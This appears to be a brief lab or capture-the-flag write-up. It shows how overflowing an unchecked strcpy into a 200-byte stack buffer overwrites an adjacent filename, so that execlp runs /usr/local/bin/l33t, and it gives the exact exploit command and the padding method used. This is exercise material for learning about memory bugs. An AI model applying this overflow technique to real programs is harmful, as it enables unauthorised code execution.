In order to execute l33t we run
```
./3 3 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////usr/local/bin/l33t
```

This works as argument writes into filename onto the stack through the buffer overflow ```strcpy(argument, argv[2]);```. The overwritten filename is then executed here ```execlp(filename, filename, argument, (char *)0);```
calliong l33t.

Specifically to overwrite at least 200 characters as shown here
```
char argument[200] = "";
char filename[200] = "";
```
to find the exact number we overwrite with much more than 200 and just count how many extra are printed by ```Executing filename //``` we then did removed the extra until it was judt injecting the ```usr/local/bin/l33t``` string